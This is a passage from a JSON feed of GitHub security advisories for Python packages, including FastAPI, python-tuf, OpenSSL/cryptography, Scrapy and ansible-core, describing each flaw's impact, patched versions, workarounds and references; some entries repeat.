id=\"impact-1\">Impact</h4>\n<p>An attacker is able to cause a DoS on a FastApi server via a malicious Content-Type header if it parses Form data.</p>\n<h4 id=\"occurrences\">Occurrences</h4>\n<p><a href=\"https://github.com/tiangolo/fastapi/blob/d74b3b25659b42233a669f032529880de8bd6c2d/fastapi/params.py#L586\">params.py L586</a></p>\n</details>\n### References\n\n<ul>\n<li><a href=\"https://github.com/Kludex/python-multipart/security/advisories/GHSA-2jv5-9r88-3w3p\">https://github.com/Kludex/python-multipart/security/advisories/GHSA-2jv5-9r88-3w3p</a></li>\n<li><a href=\"https://github.com/Kludex/python-multipart/commit/20f0ef6b4e4caf7d69a667c54dff57fe467109a4\">https://github.com/Kludex/python-multipart/commit/20f0ef6b4e4caf7d69a667c54dff57fe467109a4</a></li>\n<li><a href=\"https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74\">https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74</a></li>\n<li><a href=\"https://github.com/encode/starlette/security/advisories/GHSA-93gm-qmq6-w238\">https://github.com/encode/starlette/security/advisories/GHSA-93gm-qmq6-w238</a></li>\n<li><a href=\"https://github.com/tiangolo/fastapi/security/advisories/GHSA-qf9m-vfgh-m389\">https://github.com/tiangolo/fastapi/security/advisories/GHSA-qf9m-vfgh-m389</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-24762\">https://nvd.nist.gov/vuln/detail/CVE-2024-24762</a></li>\n<li><a href=\"https://github.com/encode/starlette/commit/13e5c26a27f4903924624736abd6131b2da80cc5\">https://github.com/encode/starlette/commit/13e5c26a27f4903924624736abd6131b2da80cc5</a></li>\n<li><a href=\"https://github.com/tiangolo/fastapi/commit/9d34ad0ee8a0dfbbcce06f76c2d5d851085024fc\">https://github.com/tiangolo/fastapi/commit/9d34ad0ee8a0dfbbcce06f76c2d5d851085024fc</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/fastapi/PYSEC-2024-38.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/fastapi/PYSEC-2024-38.yaml</a></li>\n<li><a href=\"https://github.com/tiangolo/fastapi/releases/tag/0.109.1\">https://github.com/tiangolo/fastapi/releases/tag/0.109.1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2jv5-9r88-3w3p\">https://github.com/advisories/GHSA-2jv5-9r88-3w3p</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2jv5-9r88-3w3p",
            "title": "[fastapi] python-multipart vulnerable to Content-Type Header ReDoS",
            "date_modified": "2024-02-16T23:41:49.000Z",
            "date_published": "2024-02-12T17:28:12.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2jv5-9r88-3w3p"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The security of both a TUF client and repository implementations depend on the concept of trusted Metadata objects verifying the signatures over other Metadata that it delegates to. This verification process uses <code>Targets.get_delegated_role(delegated_role: str)</code> to find the delegation information.</p>\n<p><code>tuf.api.metadata.Targets.get_delegated_role()</code> should ensure that the given <code>delegated_rolename</code> is actually a name of a role that is delegated by that Targets, but in the case of \"succinct delegation\" this does not happen.</p>\n<p><code>tuf.ngclient</code> users are <strong>not</strong> impacted but direct users of <code>tuf.api.metadata</code> could be impacted.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>If an attacker can make a Metadata API user run <code>Targets.get_delegated_role()</code> so that </p>\n<ol>\n<li>the <code>Targets</code> uses succinct delegation</li>\n<li>the <code>delegated_role</code> argument is not actually delegated by the <code>Targets</code></li>\n</ol>\n<p>the result will be incorrect.</p>\n<p>This also means that if an attacker can make a Metadata API user run <code>Targets.verify_delegate()</code> or <code>Targets.get_verification_result()</code> so that</p>\n<ol>\n<li>the delegating <code>Targets</code> uses a succinct delegation</li>\n<li>the <code>delegated_role</code> argument is the name of some unrelated Metadata</li>\n<li>that other Metadata is correctly signed by the keys defined in the succinct delegation</li>\n</ol>\n<p>the result would be a successful verification even though the <code>Targets</code> in question does not actually delegate to <code>delegated_role</code>.</p>\n<p>The impact is estimated to be low for following reasons:</p>\n<ul>\n<li>This cannot impact a TUF client that implements the client workflow as specified since the delegated role name is not an input but is collected from the (trusted) delegating Targets itself</li>\n<li>Actual signature verification is not bypassed: The verified metadata <em>must</em> still be correctly signed by the keys specified in the delegating role.</li>\n<li>The described situations are somewhat hypothetical: there does not seem to be any reason for a python-tuf user (whether client or a repository) to use <code>tuf.api.metadata</code> in this way.</li>\n</ul>\n<p>All users of <code>tuf.ngclient</code> are specifically <strong>not</strong> impacted. Users of <code>tuf.api.metadata</code> could be impacted if they use succinct delegations in a way described above.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>A fix is available in python-tuf 3.1.1 as commit 77cb66bc and in later releases as commit eb4834d9._</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p><code>tuf.api.metadata</code> users should only call <code>Targets.get_delegated_role()</code>, <code>Targets.verify_delegate()</code> or <code>Targets.get_verification_result()</code> with <code>delegated_role</code> argument that is known to be delegated by the <code>Targets</code> in question.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/theupdateframework/python-tuf/security/advisories/GHSA-77hh-43cm-v8j6\">https://github.com/theupdateframework/python-tuf/security/advisories/GHSA-77hh-43cm-v8j6</a></li>\n<li><a href=\"https://github.com/theupdateframework/python-tuf/commit/77cb66bc879d108c449ba4c46dfb0e3a9e57a785\">https://github.com/theupdateframework/python-tuf/commit/77cb66bc879d108c449ba4c46dfb0e3a9e57a785</a></li>\n<li><a href=\"https://github.com/theupdateframework/python-tuf/commit/eb4834d9205d07ae164bc6c5b97787585c0acfdc\">https://github.com/theupdateframework/python-tuf/commit/eb4834d9205d07ae164bc6c5b97787585c0acfdc</a></li>\n<li><a href=\"https://github.com/theupdateframework/python-tuf/releases/tag/v3.1.1\">https://github.com/theupdateframework/python-tuf/releases/tag/v3.1.1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-77hh-43cm-v8j6\">https://github.com/advisories/GHSA-77hh-43cm-v8j6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-77hh-43cm-v8j6",
            "title": "[tuf] tuf's Metadata API:  Targets.get_delegated_role() is missing input validation",
            "date_modified": "2024-02-16T23:35:41.000Z",
            "date_published": "2024-02-16T23:35:39.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-77hh-43cm-v8j6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Issue summary: Processing a maliciously formatted PKCS12 file may lead OpenSSL\nto crash leading to a potential Denial of Service attack</p>\n<p>Impact summary: Applications loading files in the PKCS12 format from untrusted\nsources might terminate abruptly.</p>\n<p>A file in PKCS12 format can contain certificates and keys and may come from an\nuntrusted source. The PKCS12 specification allows certain fields to be NULL, but\nOpenSSL does not correctly check for this case. This can lead to a NULL pointer\ndereference that results in OpenSSL crashing. If an application processes PKCS12\nfiles from an untrusted source using the OpenSSL APIs then that application will\nbe vulnerable to this issue.</p>\n<p>OpenSSL APIs that are vulnerable to this are: PKCS12_parse(),\nPKCS12_unpack_p7data(), PKCS12_unpack_p7encdata(), PKCS12_unpack_authsafes()\nand PKCS12_newpass().</p>\n<p>We have also fixed a similar issue in SMIME_write_PKCS7(). However since this\nfunction is related to writing data we do not consider it security significant.</p>\n<p>The FIPS modules in 3.2, 3.1 and 3.0 are not affected by this issue.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-0727\">https://nvd.nist.gov/vuln/detail/CVE-2024-0727</a></li>\n<li><a href=\"https://github.com/openssl/openssl/commit/09df4395b5071217b76dc7d3d2e630eb8c5a79c2\">https://github.com/openssl/openssl/commit/09df4395b5071217b76dc7d3d2e630eb8c5a79c2</a></li>\n<li><a href=\"https://github.com/openssl/openssl/commit/775acfdbd0c6af9ac855f34969cdab0c0c90844a\">https://github.com/openssl/openssl/commit/775acfdbd0c6af9ac855f34969cdab0c0c90844a</a></li>\n<li><a href=\"https://github.com/openssl/openssl/commit/d135eeab8a5dbf72b3da5240bab9ddb7678dbd2c\">https://github.com/openssl/openssl/commit/d135eeab8a5dbf72b3da5240bab9ddb7678dbd2c</a></li>\n<li><a href=\"https://github.openssl.org/openssl/extended-releases/commit/03b3941d60c4bce58fab69a0c22377ab439bc0e8\">https://github.openssl.org/openssl/extended-releases/commit/03b3941d60c4bce58fab69a0c22377ab439bc0e8</a></li>\n<li><a href=\"https://github.openssl.org/openssl/extended-releases/commit/aebaa5883e31122b404e450732dc833dc9dee539\">https://github.openssl.org/openssl/extended-releases/commit/aebaa5883e31122b404e450732dc833dc9dee539</a></li>\n<li><a href=\"https://www.openssl.org/news/secadv/20240125.txt\">https://www.openssl.org/news/secadv/20240125.txt</a></li>\n<li><a href=\"https://github.com/github/advisory-database/pull/3472\">https://github.com/github/advisory-database/pull/3472</a></li>\n<li><a href=\"https://github.com/openssl/openssl/pull/23362\">https://github.com/openssl/openssl/pull/23362</a></li>\n<li><a href=\"https://github.com/alexcrichton/openssl-src-rs/commit/add20f73b6b42be7451af2e1044d4e0e778992b2\">https://github.com/alexcrichton/openssl-src-rs/commit/add20f73b6b42be7451af2e1044d4e0e778992b2</a></li>\n<li><a href=\"https://github.com/pyca/cryptography/commit/3519591d255d4506fbcd0d04037d45271903c64d\">https://github.com/pyca/cryptography/commit/3519591d255d4506fbcd0d04037d45271903c64d</a></li>\n<li><a href=\"https://security.netapp.com/advisory/ntap-20240208-0006\">https://security.netapp.com/advisory/ntap-20240208-0006</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9v9h-cgj8-h64p\">https://github.com/advisories/GHSA-9v9h-cgj8-h64p</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9v9h-cgj8-h64p",
            "title": "[cryptography] Null pointer dereference in PKCS12 parsing",
            "date_modified": "2024-02-16T20:48:37.000Z",
            "date_published": "2024-01-26T09:30:23.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9v9h-cgj8-h64p"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Scrapy limits allowed response sizes by default through the <a href=\"https://docs.scrapy.org/en/latest/topics/settings.html#download-maxsize\"><code>DOWNLOAD_MAXSIZE</code></a> and <a href=\"https://docs.scrapy.org/en/latest/topics/settings.html#download-warnsize\"><code>DOWNLOAD_WARNSIZE</code></a> settings.</p>\n<p>However, those limits were only being enforced during the download of the raw, usually-compressed response bodies, and not during decompression, making Scrapy vulnerable to <a href=\"https://cwe.mitre.org/data/definitions/409.html\">decompression bombs</a>.</p>\n<p>A malicious website being scraped could send a small response that, on decompression, could exhaust the memory available to the Scrapy process, potentially affecting any other process sharing that memory, and affecting disk usage in case of uncompressed response caching.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Upgrade to Scrapy 2.11.1.</p>\n<p>If you are using Scrapy 1.8 or a lower version, and upgrading to Scrapy 2.11.1 is not an option, you may upgrade to Scrapy 1.8.4 instead.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>There is no easy workaround.</p>\n<p>Disabling HTTP decompression altogether is impractical, as HTTP compression is a rather common practice.</p>\n<p>However, it is technically possible to manually backport the 2.11.1 or 1.8.4 fix, replacing the corresponding components of an unpatched version of Scrapy with patched versions copied into your own code.</p>\n<h3 id=\"acknowledgements\">Acknowledgements</h3>\n<p>This security issue was reported by @dmandefy  <a href=\"https://huntr.com/bounties/c4a0fac9-0c5a-4718-9ee4-2d06d58adabb/\">through huntr.com</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/scrapy/scrapy/security/advisories/GHSA-7j7m-v7m3-jqm7\">https://github.com/scrapy/scrapy/security/advisories/GHSA-7j7m-v7m3-jqm7</a></li>\n<li><a href=\"https://github.com/scrapy/scrapy/commit/71b8741e3607cfda2833c7624d4ada87071aa8e5\">https://github.com/scrapy/scrapy/commit/71b8741e3607cfda2833c7624d4ada87071aa8e5</a></li>\n<li><a href=\"https://github.com/scrapy/scrapy/commit/809bfac4890f75fc73607318a04d2ccba71b3d9f\">https://github.com/scrapy/scrapy/commit/809bfac4890f75fc73607318a04d2ccba71b3d9f</a></li>\n<li><a href=\"https://docs.scrapy.org/en/latest/news.html#scrapy-2-11-1-2024-02-14\">https://docs.scrapy.org/en/latest/news.html#scrapy-2-11-1-2024-02-14</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7j7m-v7m3-jqm7\">https://github.com/advisories/GHSA-7j7m-v7m3-jqm7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7j7m-v7m3-jqm7",
            "title": "[scrapy] Scrapy decompression bomb vulnerability",
            "date_modified": "2024-02-16T16:07:15.000Z",
            "date_published": "2024-02-16T16:07:13.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7j7m-v7m3-jqm7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Scrapy limits allowed response sizes by default through the <a href=\"https://docs.scrapy.org/en/latest/topics/settings.html#download-maxsize\"><code>DOWNLOAD_MAXSIZE</code></a> and <a href=\"https://docs.scrapy.org/en/latest/topics/settings.html#download-warnsize\"><code>DOWNLOAD_WARNSIZE</code></a> settings.</p>\n<p>However, those limits were only being enforced during the download of the raw, usually-compressed response bodies, and not during decompression, making Scrapy vulnerable to <a href=\"https://cwe.mitre.org/data/definitions/409.html\">decompression bombs</a>.</p>\n<p>A malicious website being scraped could send a small response that, on decompression, could exhaust the memory available to the Scrapy process, potentially affecting any other process sharing that memory, and affecting disk usage in case of uncompressed response caching.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Upgrade to Scrapy 2.11.1.</p>\n<p>If you are using Scrapy 1.8 or a lower version, and upgrading to Scrapy 2.11.1 is not an option, you may upgrade to Scrapy 1.8.4 instead.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>There is no easy workaround.</p>\n<p>Disabling HTTP decompression altogether is impractical, as HTTP compression is a rather common practice.</p>\n<p>However, it is technically possible to manually backport the 2.11.1 or 1.8.4 fix, replacing the corresponding components of an unpatched version of Scrapy with patched versions copied into your own code.</p>\n<h3 id=\"acknowledgements\">Acknowledgements</h3>\n<p>This security issue was reported by @dmandefy  <a href=\"https://huntr.com/bounties/c4a0fac9-0c5a-4718-9ee4-2d06d58adabb/\">through huntr.com</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/scrapy/scrapy/security/advisories/GHSA-7j7m-v7m3-jqm7\">https://github.com/scrapy/scrapy/security/advisories/GHSA-7j7m-v7m3-jqm7</a></li>\n<li><a href=\"https://github.com/scrapy/scrapy/commit/71b8741e3607cfda2833c7624d4ada87071aa8e5\">https://github.com/scrapy/scrapy/commit/71b8741e3607cfda2833c7624d4ada87071aa8e5</a></li>\n<li><a href=\"https://github.com/scrapy/scrapy/commit/809bfac4890f75fc73607318a04d2ccba71b3d9f\">https://github.com/scrapy/scrapy/commit/809bfac4890f75fc73607318a04d2ccba71b3d9f</a></li>\n<li><a href=\"https://docs.scrapy.org/en/latest/news.html#scrapy-2-11-1-2024-02-14\">https://docs.scrapy.org/en/latest/news.html#scrapy-2-11-1-2024-02-14</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7j7m-v7m3-jqm7\">https://github.com/advisories/GHSA-7j7m-v7m3-jqm7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7j7m-v7m3-jqm7",
            "title": "[scrapy] Scrapy decompression bomb vulnerability",
            "date_modified": "2024-02-16T16:07:15.000Z",
            "date_published": "2024-02-16T16:07:13.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7j7m-v7m3-jqm7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>When you send a request with the <code>Authorization</code> header to one domain, and the response asks to redirect to a different domain, Scrapy’s built-in redirect middleware creates a follow-up redirect request that keeps the original <code>Authorization</code> header, leaking its content to that second domain.</p>\n<p>The <a href=\"https://fetch.spec.whatwg.org/#ref-for-cors-non-wildcard-request-header-name\">right behavior</a> would be to drop the <code>Authorization</code> header instead, in this scenario.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Upgrade to Scrapy 2.11.1.</p>\n<p>If you are using Scrapy 1.8 or a lower version, and upgrading to Scrapy 2.11.1 is not an option, you may upgrade to Scrapy 1.8.4 instead.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If you cannot upgrade, make sure that you are not using the <code>Authentication</code> header, either directly or through some third-party plugin.</p>\n<p>If you need to use that header in some requests, add <code>\"dont_redirect\": True</code> to the <code>request.meta</code> dictionary of those requests to disable following redirects for them.</p>\n<p>If you need to keep (same domain) redirect support on those requests, make sure you trust the target website not to redirect your requests to a different domain.</p>\n<h3 id=\"acknowledgements\">Acknowledgements</h3>\n<p>This security issue was reported by @ranjit-git  <a href=\"https://huntr.com/bounties/49974321-2718-43e3-a152-62b16eed72a9/\">through huntr.com</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/scrapy/scrapy/security/advisories/GHSA-cw9j-q3vf-hrrv\">https://github.com/scrapy/scrapy/security/advisories/GHSA-cw9j-q3vf-hrrv</a></li>\n<li><a href=\"https://github.com/scrapy/scrapy/commit/ee7bd9d217fc126063575d5649f00bdeeca2faae\">https://github.com/scrapy/scrapy/commit/ee7bd9d217fc126063575d5649f00bdeeca2faae</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cw9j-q3vf-hrrv\">https://github.com/advisories/GHSA-cw9j-q3vf-hrrv</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cw9j-q3vf-hrrv",
            "title": "[scrapy] Scrapy authorization header leakage on cross-domain redirect",
            "date_modified": "2024-02-15T15:32:17.000Z",
            "date_published": "2024-02-15T15:32:15.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cw9j-q3vf-hrrv"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>When you send a request with the <code>Authorization</code> header to one domain, and the response asks to redirect to a different domain, Scrapy’s built-in redirect middleware creates a follow-up redirect request that keeps the original <code>Authorization</code> header, leaking its content to that second domain.</p>\n<p>The <a href=\"https://fetch.spec.whatwg.org/#ref-for-cors-non-wildcard-request-header-name\">right behavior</a> would be to drop the <code>Authorization</code> header instead, in this scenario.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Upgrade to Scrapy 2.11.1.</p>\n<p>If you are using Scrapy 1.8 or a lower version, and upgrading to Scrapy 2.11.1 is not an option, you may upgrade to Scrapy 1.8.4 instead.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If you cannot upgrade, make sure that you are not using the <code>Authentication</code> header, either directly or through some third-party plugin.</p>\n<p>If you need to use that header in some requests, add <code>\"dont_redirect\": True</code> to the <code>request.meta</code> dictionary of those requests to disable following redirects for them.</p>\n<p>If you need to keep (same domain) redirect support on those requests, make sure you trust the target website not to redirect your requests to a different domain.</p>\n<h3 id=\"acknowledgements\">Acknowledgements</h3>\n<p>This security issue was reported by @ranjit-git  <a href=\"https://huntr.com/bounties/49974321-2718-43e3-a152-62b16eed72a9/\">through huntr.com</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/scrapy/scrapy/security/advisories/GHSA-cw9j-q3vf-hrrv\">https://github.com/scrapy/scrapy/security/advisories/GHSA-cw9j-q3vf-hrrv</a></li>\n<li><a href=\"https://github.com/scrapy/scrapy/commit/ee7bd9d217fc126063575d5649f00bdeeca2faae\">https://github.com/scrapy/scrapy/commit/ee7bd9d217fc126063575d5649f00bdeeca2faae</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cw9j-q3vf-hrrv\">https://github.com/advisories/GHSA-cw9j-q3vf-hrrv</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cw9j-q3vf-hrrv",
            "title": "[scrapy] Scrapy authorization header leakage on cross-domain redirect",
            "date_modified": "2024-02-15T15:32:17.000Z",
            "date_published": "2024-02-15T15:32:15.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cw9j-q3vf-hrrv"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The following parts of the Scrapy API were found to be vulnerable to a <a href=\"https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS\">ReDoS attack</a>:</p>\n<ul>\n<li><p>The <a href=\"https://docs.scrapy.org/en/latest/topics/spiders.html#scrapy.spiders.XMLFeedSpider\"><code>XMLFeedSpider</code></a> class or any subclass that uses the default node iterator: <code>iternodes</code>, as well as direct uses of the <code>scrapy.utils.iterators.xmliter</code> function.</p>\n</li>\n<li><p><strong>Scrapy 2.6.0 to 2.11.0</strong>: The <a href=\"https://docs.scrapy.org/en/latest/topics/debug.html#scrapy.utils.response.open_in_browser\"><code>open_in_browser</code></a> function for a response without a <a href=\"https://www.w3schools.com/tags/tag_base.asp\">base tag</a>.</p>\n</li>\n</ul>\n<p>Handling a malicious response could cause extreme CPU and memory usage during the parsing of its content, due to the use of vulnerable regular expressions for that parsing.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Upgrade to Scrapy 2.11.1.</p>\n<p>If you are using Scrapy 1.8 or a lower version, and upgrading to Scrapy 2.11.1 is not an option, you may upgrade to Scrapy 1.8.4 instead.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>For <code>XMLFeedSpider</code>, switch the node iterator to <code>xml</code> or <code>html</code>.</p>\n<p>For <code>open_in_browser</code>, before using the function, either manually review the response content to discard a ReDos attack or manually define the base tag to avoid its automatic definition by <code>open_in_browser</code> later.</p>\n<h3 id=\"acknowledgements\">Acknowledgements</h3>\n<p>This security issue was reported by @nicecatch2000  <a href=\"https://huntr.com/bounties/271f94f2-1e05-4616-ac43-41752389e26b/\">through huntr.com</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/scrapy/scrapy/security/advisories/GHSA-cc65-xxvf-f7r9\">https://github.com/scrapy/scrapy/security/advisories/GHSA-cc65-xxvf-f7r9</a></li>\n<li><a href=\"https://docs.scrapy.org/en/latest/news.html#scrapy-1-8-4-2024-02-14\">https://docs.scrapy.org/en/latest/news.html#scrapy-1-8-4-2024-02-14</a></li>\n<li><a href=\"https://docs.scrapy.org/en/latest/news.html#scrapy-2-11-1-2024-02-14\">https://docs.scrapy.org/en/latest/news.html#scrapy-2-11-1-2024-02-14</a></li>\n<li><a href=\"https://github.com/scrapy/scrapy/commit/479619b340f197a8f24c5db45bc068fb8755f2c5\">https://github.com/scrapy/scrapy/commit/479619b340f197a8f24c5db45bc068fb8755f2c5</a></li>\n<li><a href=\"https://github.com/scrapy/scrapy/commit/73e7c0ed011a0565a1584b8052ec757b54e5270b\">https://github.com/scrapy/scrapy/commit/73e7c0ed011a0565a1584b8052ec757b54e5270b</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cc65-xxvf-f7r9\">https://github.com/advisories/GHSA-cc65-xxvf-f7r9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cc65-xxvf-f7r9",
            "title": "[scrapy] ReDos vulnerability of XMLFeedSpider",
            "date_modified": "2024-02-15T15:30:00.000Z",
            "date_published": "2024-02-15T15:22:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cc65-xxvf-f7r9"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The following parts of the Scrapy API were found to be vulnerable to a <a href=\"https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS\">ReDoS attack</a>:</p>\n<ul>\n<li><p>The <a href=\"https://docs.scrapy.org/en/latest/topics/spiders.html#scrapy.spiders.XMLFeedSpider\"><code>XMLFeedSpider</code></a> class or any subclass that uses the default node iterator: <code>iternodes</code>, as well as direct uses of the <code>scrapy.utils.iterators.xmliter</code> function.</p>\n</li>\n<li><p><strong>Scrapy 2.6.0 to 2.11.0</strong>: The <a href=\"https://docs.scrapy.org/en/latest/topics/debug.html#scrapy.utils.response.open_in_browser\"><code>open_in_browser</code></a> function for a response without a <a href=\"https://www.w3schools.com/tags/tag_base.asp\">base tag</a>.</p>\n</li>\n</ul>\n<p>Handling a malicious response could cause extreme CPU and memory usage during the parsing of its content, due to the use of vulnerable regular expressions for that parsing.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Upgrade to Scrapy 2.11.1.</p>\n<p>If you are using Scrapy 1.8 or a lower version, and upgrading to Scrapy 2.11.1 is not an option, you may upgrade to Scrapy 1.8.4 instead.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>For <code>XMLFeedSpider</code>, switch the node iterator to <code>xml</code> or <code>html</code>.</p>\n<p>For <code>open_in_browser</code>, before using the function, either manually review the response content to discard a ReDos attack or manually define the base tag to avoid its automatic definition by <code>open_in_browser</code> later.</p>\n<h3 id=\"acknowledgements\">Acknowledgements</h3>\n<p>This security issue was reported by @nicecatch2000  <a href=\"https://huntr.com/bounties/271f94f2-1e05-4616-ac43-41752389e26b/\">through huntr.com</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/scrapy/scrapy/security/advisories/GHSA-cc65-xxvf-f7r9\">https://github.com/scrapy/scrapy/security/advisories/GHSA-cc65-xxvf-f7r9</a></li>\n<li><a href=\"https://docs.scrapy.org/en/latest/news.html#scrapy-1-8-4-2024-02-14\">https://docs.scrapy.org/en/latest/news.html#scrapy-1-8-4-2024-02-14</a></li>\n<li><a href=\"https://docs.scrapy.org/en/latest/news.html#scrapy-2-11-1-2024-02-14\">https://docs.scrapy.org/en/latest/news.html#scrapy-2-11-1-2024-02-14</a></li>\n<li><a href=\"https://github.com/scrapy/scrapy/commit/479619b340f197a8f24c5db45bc068fb8755f2c5\">https://github.com/scrapy/scrapy/commit/479619b340f197a8f24c5db45bc068fb8755f2c5</a></li>\n<li><a href=\"https://github.com/scrapy/scrapy/commit/73e7c0ed011a0565a1584b8052ec757b54e5270b\">https://github.com/scrapy/scrapy/commit/73e7c0ed011a0565a1584b8052ec757b54e5270b</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cc65-xxvf-f7r9\">https://github.com/advisories/GHSA-cc65-xxvf-f7r9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cc65-xxvf-f7r9",
            "title": "[scrapy] ReDos vulnerability of XMLFeedSpider",
            "date_modified": "2024-02-15T15:30:00.000Z",
            "date_published": "2024-02-15T15:22:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cc65-xxvf-f7r9"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An information disclosure flaw was found in ansible-core due to a failure to respect the <code>ANSIBLE_NO_LOG</code> configuration in some scenarios. It was discovered that information is still included in the output in certain tasks, such as loop items. Depending on the task, this issue may include sensitive information, such as decrypted secret values.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-0690\">https://nvd.nist.gov/vuln/detail/CVE-2024-0690</a></li>\n<li><a href=\"https://github.com/ansible/ansible/pull/82565\">https://github.com/ansible/ansible/pull/82565</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/CVE-2024-0690\">https://access.redhat.com/security/cve/CVE-2024-0690</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2259013\">https://bugzilla.redhat.com/show_bug.cgi?id=2259013</a></li>\n<li><a href=\"https://github.com/ansible/ansible/commit/6935c8e303440addd3871ecf8e04bde61080b032\">https://github.com/ansible/ansible/commit/6935c8e303440addd3871ecf8e04bde61080b032</a></li>\n<li><a href=\"https://github.com/ansible/ansible/commit/78db3a3de6b40fb52d216685ae7cb903c609c3e1\">https://github.com/ansible/ansible/commit/78db3a3de6b40fb52d216685ae7cb903c609c3e1</a></li>\n<li><a href=\"https://github.com/ansible/ansible/commit/b9a03bbf5a63459468baf8895ff74a62e9be4532\">https://github.com/ansible/ansible/commit/b9a03bbf5a63459468baf8895ff74a62e9be4532</a></li>\n<li><a href=\"https://github.com/ansible/ansible/commit/beb04bc2642c208447c5a936f94310528a1946b1\">https://github.com/ansible/ansible/commit/beb04bc2642c208447c5a936f94310528a1946b1</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2024:0733\">https://access.redhat.com/errata/RHSA-2024:0733</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/ansible-core/PYSEC-2024-36.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/ansible-core/PYSEC-2024-36.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-h24r-m9qc-pvpg\">https://github.com/advisories/GHSA-h24r-m9qc-pvpg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-h24r-m9qc-pvpg",
            "title": "[ansible-core] Ansible-core information disclosure flaw",
            "date_modified": "2024-02-14T14:57:22.000Z",
            "date_published": "2024-02-06T12:30:31.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-h24r-m9qc-pvpg"
            },
            "tags": [
                "severity"
